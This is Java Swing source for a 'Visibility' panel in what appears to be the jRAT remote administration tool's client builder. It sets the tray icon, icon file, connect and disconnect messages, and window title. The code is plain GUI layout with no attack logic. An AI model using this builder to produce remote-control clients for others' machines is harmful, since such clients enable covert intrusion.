package io.jrat.controller.ui.panels;

import iconlib.IconUtils;
import io.jrat.controller.Constants;
import io.jrat.controller.ErrorDialog;
import io.jrat.controller.Main;
import io.jrat.controller.ui.components.JPlaceholderTextField;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;

import javax.imageio.ImageIO;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;


@SuppressWarnings("serial")
public class PanelBuildVisibility extends JPanel {

	private JCheckBox chckbxUseTrayIcon;
	private PanelImage panelImage;
	private JTextField txtIcon;
	private JTextField txtConnect;
	private JTextField txtDisconnect;
	private JTextField txtTitle;

	public boolean useIcon() {
		return chckbxUseTrayIcon.isSelected();
	}

	public String getIcon() {
		return txtIcon.getText();
	}

	public String getConnectMessage() {
		return txtConnect.getText().trim();
	}

	public String getDisconnectMessage() {
		return txtDisconnect.getText().trim();
	}

	public String getTitle() {
		return txtTitle.getText().trim();
	}

	public PanelBuildVisibility() {

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Visibility"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 427, GroupLayout.PREFERRED_SIZE).addContainerGap(13, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 273, GroupLayout.PREFERRED_SIZE).addContainerGap(16, Short.MAX_VALUE)));

		chckbxUseTrayIcon = new JCheckBox("Use tray icon");

		if (Main.liteVersion) {
			chckbxUseTrayIcon.setEnabled(false);
			chckbxUseTrayIcon.setSelected(true);
		}

		JLabel label = new JLabel("");
		label.setIcon(IconUtils.getIcon("glasses"));

		JPanel panel_1 = new JPanel();
		panel_1.setBorder(BorderFactory.createLineBorder(Color.gray.brighter()));

		JLabel lblIcon = new JLabel("Icon:");

		txtIcon = new JPlaceholderTextField("default");
		txtIcon.setEditable(false);
		txtIcon.setColumns(10);

		JButton button = new JButton("");
		button.setIcon(IconUtils.getIcon("folder-go"));
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser c = new JFileChooser();
				c.showOpenDialog(null);
				File file = c.getSelectedFile();

				if (file != null) {
					try {
						ImageIcon icon = new ImageIcon(ImageIO.read(file));
						panelImage.image = icon.getImage();
						txtIcon.setText(file.getAbsolutePath());
						repaint();
					} catch (Exception e) {
						ErrorDialog.create(e);
						e.printStackTrace();
					}
				}
			}
		});

		JButton btnDefault = new JButton("Default");
		btnDefault.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				ImageIcon icon = IconUtils.getIcon("icon-16x16");
				panelImage.image = icon.getImage();
				txtIcon.setText("default");
				repaint();
			}
		});
		btnDefault.setIcon(IconUtils.getIcon("icon-16x16"));

		JLabel lblMessages = new JLabel("Messages:");

		txtConnect = new JPlaceholderTextField("You are now connected!");
		txtConnect.setColumns(10);
		panel_1.setLayout(new BorderLayout(0, 0));

		panelImage = new PanelImage();
		panelImage.image = IconUtils.getIcon("icon-16x16").getImage();
		panel_1.add(panelImage, BorderLayout.CENTER);

		txtDisconnect = new JPlaceholderTextField("You are now disconnected!");
		txtDisconnect.setColumns(10);

		txtTitle = new JPlaceholderTextField(Constants.NAME);
		txtTitle.setColumns(10);

		JLabel lblConnect = new JLabel("Connect:");

		JLabel lblDisconnect = new JLabel("Disconnect:");

		JLabel lblTitle = new JLabel("Title:");
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addGap(20).addComponent(label).addGap(6).addComponent(chckbxUseTrayIcon)).addGroup(gl_panel.createSequentialGroup().addGap(45).addComponent(panel_1, GroupLayout.PREFERRED_SIZE, 43, GroupLayout.PREFERRED_SIZE).addGap(10).addComponent(lblIcon).addGap(4).addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addComponent(txtIcon, GroupLayout.PREFERRED_SIZE, 177, GroupLayout.PREFERRED_SIZE).addComponent(btnDefault)).addGap(6).addComponent(button)).addGroup(gl_panel.createSequentialGroup().addGap(20).addComponent(lblMessages)).addGroup(gl_panel.createSequentialGroup().addGap(44).addGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addComponent(lblConnect).addComponent(lblDisconnect).addComponent(lblTitle)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_panel.createParallelGroup(Alignment.LEADING, false).addComponent(txtConnect, GroupLayout.DEFAULT_SIZE, 212, Short.MAX_VALUE).addComponent(txtDisconnect).addComponent(txtTitle)))).addGap(56)));
		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addGap(11).addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addComponent(label, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE).addComponent(chckbxUseTrayIcon)).addGap(31).addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addComponent(panel_1, GroupLayout.PREFERRED_SIZE, 41, GroupLayout.PREFERRED_SIZE).addGroup(gl_panel.createSequentialGroup().addGap(3).addComponent(lblIcon)).addGroup(gl_panel.createSequentialGroup().addComponent(txtIcon, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addGap(11).addComponent(btnDefault)).addComponent(button)).addGap(16).addComponent(lblMessages).addGap(6).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(txtConnect, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblConnect)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(txtDisconnect, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblDisconnect)).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(txtTitle, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblTitle)).addGap(16)));
		panel.setLayout(gl_panel);
		setLayout(groupLayout);

	}
}
